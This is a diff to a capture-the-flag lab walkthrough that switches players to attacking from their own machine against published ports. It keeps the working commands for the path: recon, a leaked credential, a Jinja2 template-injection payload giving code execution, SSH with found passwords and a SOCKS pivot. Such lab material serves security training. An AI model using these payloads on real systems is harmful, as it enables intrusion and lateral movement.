@@ -18,46 +18,42 @@
 SSH into `arduenna` as `eburo` → **SUID-root PATH-hijack** → read `/root/flag.txt`.
 
 ```
-attacker ── guest 172.20.0.0/24 ── castra(pivot) ── internal 10.10.10.0/24 ── arduenna(target)
- 172.20.0.5                        .10 / 10.10.10.5                            10.10.10.10
+your machine ── (host ports) ── castra(pivot) ── internal 10.10.10.0/24 ── arduenna(target)
+                 :8080 / :2022   .10 / 10.10.10.5                          10.10.10.10
 ```
 
 **Deploy:**
 
 ```bash
-docker compose up -d --build                       # pivot + target (published)
-docker compose --profile attacker up -d --build    # + the in-lab attacker box
+docker compose up -d --build        # pivot + target; castra published on :8080 / :2022
 ```
 
-**Entry.** This walkthrough is written from the **in-lab attacker box** (so the
-addresses match `test/solve.sh`):
+**Entry.** Players attack **from their own machine** against the pivot's
+published host ports. This walkthrough uses `<lab-host>` for the lab address:
 
-```bash
-ssh scout@<lab-host> -p 2222        # password: ambiorix
-# fallback: docker compose exec attacker bash
 ```
-
-From your **own machine** instead, use the pivot's published host ports — swap
-`172.20.0.10` → `<lab-host>`, web `:80` → `:8080`, SSH → `-p 2022`.
+http://<lab-host>:8080      # castra's web console  (the foothold surface)
+ssh scout@<lab-host> -p 2022   # castra's maintenance SSH  (once you find the creds)
+```
 
 > **Note on language:** everything the player sees in-environment is in **Latin**
 > (web UI, login banners, deploy notes, muster roll, the SUID tool). English
 > translations of every clue are inline below and collected in the glossary at
 > the end. Credentials / IPs are literal ASCII.
 
-All commands below are run from inside the attacker box.
+All commands below are run from your own machine. `proxychains4` is configured
+locally (`socks5 127.0.0.1 1080` in `/etc/proxychains4.conf`) for the pivot stage.
 
 ---
 
-## Stage 0 — Recon on the frontier (guest network)
+## Stage 0 — Recon on the frontier
 
-The scout is `172.20.0.5`. Only `castra` (`172.20.0.10`) is reachable; the inner
-network does not exist yet from the player's point of view.
+From your own machine, only `castra` is reachable, through its published ports;
+the inner network does not exist yet from the player's point of view.
 
 ```bash
-nmap -sn 172.20.0.0/24            # finds 172.20.0.10 (castra) + the gateway
-nmap -sT -p- 172.20.0.10          # 22/tcp ssh, 80/tcp http
-curl -s http://172.20.0.10/       # Castra Legionis — Frontier Watch Console
+nmap -sT -p- <lab-host>                 # 2022/tcp ssh, 8080/tcp http (published)
+curl -s http://<lab-host>:8080/         # Castra Legionis — Frontier Watch Console
 ```
 
 ---
@@ -69,7 +65,7 @@ curl -s http://172.20.0.10/       # Castra Legionis — Frontier Watch Console
 The login page ships a dev-reminder in an HTML comment:
 
 ```bash
-curl -s http://172.20.0.10/login | grep -i -- '-->'
+curl -s http://<lab-host>:8080/login | grep -i -- '-->'
 # <!-- mandatum centurionis: tesseram communem recrutorum dele antequam in
 #      proelium imus. etiamnunc valet: tiro / AveLegioXIV-54 -->
 ```
@@ -86,11 +82,11 @@ is escaped** (safe); the **`sigil`** field is rendered through
 
 ```bash
 C=/tmp/jar
-curl -s -c $C -b $C -d 'username=tiro&password=AveLegioXIV-54' http://172.20.0.10/login
+curl -s -c $C -b $C -d 'username=tiro&password=AveLegioXIV-54' http://<lab-host>:8080/login
 
 # confirm the injection
 curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode 'sigil={{7*7}}' \
-     http://172.20.0.10/board | grep -A1 'class="sigil"'
+     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
 #   <pre class="sigil">49</pre>     <-- 7*7 rendered -> Jinja2 SSTI
 ```
 
@@ -104,7 +100,7 @@ Standard Jinja2 gadget (reaches `os` via `cycler`'s module globals):
 ```bash
 RCE='{{ cycler.__init__.__globals__.os.popen("id").read() }}'
 curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$RCE" \
-     http://172.20.0.10/board | grep -A1 'class="sigil"'
+     http://<lab-host>:8080/board | grep -A1 'class="sigil"'
 #   uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -115,7 +111,7 @@ Code execution as **`www-data`** on `castra`.
 ```bash
 READ='{{ cycler.__init__.__globals__.os.popen("cat /opt/castra/DEPLOY_NOTES.txt").read() }}'
 curl -s -c $C -b $C --data-urlencode 'report=' --data-urlencode "sigil=$READ" \
-     http://172.20.0.10/board
+     http://<lab-host>:8080/board
 ```
 
 The deploy notes reveal:
@@ -133,8 +129,7 @@ The deploy notes reveal:
 ### 2a. SSH into castra and read the muster roll (breadcrumb #2)
 
 ```bash
-sshpass -p 'FrontierWatch-54BC' ssh -o StrictHostKeyChecking=no scout@172.20.0.10
-# (or just: ssh scout@172.20.0.10  and type the password)
+ssh scout@<lab-host> -p 2022               # password: FrontierWatch-54BC
 
 scout@castra:~$ cat ~/muster.txt
 #   Tabula militum — castra bellica interiora (arduenna, 10.10.10.10)
@@ -152,8 +147,9 @@ scout@castra:~$ exit
 ### 2b. Open a SOCKS proxy through castra (SSH dynamic forward)
 
 ```bash
-ssh -D 1080 -fN scout@172.20.0.10          # password: FrontierWatch-54BC
-# proxychains4 is pre-configured: socks5 127.0.0.1 1080  (/etc/proxychains4.conf)
+ssh -D 1080 -fN scout@<lab-host> -p 2022   # password: FrontierWatch-54BC
+# proxychains4 reads socks5 127.0.0.1 1080 from /etc/proxychains4.conf (set this
+# up once on your own machine if it isn't already the default).
 ```
 
 ### 2c. Confirm the inner network is now reachable
@@ -209,11 +205,12 @@ flag{atuatuca_ambush_54bc}
 
 ## Automated verification
 
-`test/solve.sh` runs this entire path non-interactively and asserts the flag:
+`test/solve.sh` runs this entire path non-interactively from the host (against
+the published ports) and asserts the flag:
 
 ```bash
-docker compose --profile attacker up -d --build   # solve.sh runs inside attacker
-./test/solve.sh                                    # prints "==== PASS ====" + flag
+docker compose up -d --build
+./test/solve.sh                 # prints "==== PASS ====" + flag
 ```
 
 ## Intended path vs. traps
